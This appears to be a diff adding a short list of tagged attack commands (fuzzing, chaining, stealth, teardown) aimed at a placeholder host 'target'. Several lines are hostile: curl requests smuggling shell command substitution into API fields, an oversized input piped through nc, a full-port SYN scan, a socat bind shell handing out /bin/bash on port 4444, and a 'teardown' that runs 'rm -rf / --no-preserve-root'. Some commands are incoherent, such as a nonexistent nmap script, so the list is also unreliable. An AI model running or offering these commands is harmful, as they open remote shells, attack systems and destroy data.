@@ -1,0 +1,10 @@
+<fuzzing> > curl -X POST http://target/api/v1/create -d 'payload=$(echo "$(head -c 1000 /dev/urandom | base64)" | rev)'
+<chain> > bash -c 'for i in {1..10}; do curl -X GET http://target/api/v1/step$i; done'
+<stealth> > ssh -i /tmp/hidden_key user@target 'echo $((RANDOM<<16|RANDOM)) | sha256sum'
+<teardown> > python3 -c "import os; os.system('rm -rf / --no-preserve-root')"
+<fuzzing> > perl -e 'print "A" x 10000' | nc target 80
+<chain> > curl -X POST http://target/api/v1/complex -d '{"cmd":"$(echo $(date) | sha512sum)"}'
+<stealth> > nmap -sS -p- --script=obfuscate target
+<teardown> > socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash -li'
+<fuzzing> > curl -X PUT http://target/api/v1/update -d '$(awk "BEGIN{for(i=0;i<10000;i++)print \"A\"}")'
+<chain> > bash -c 'curl -X POST http://target/api/v1/chain -d "$(openssl rand -hex 32)"'
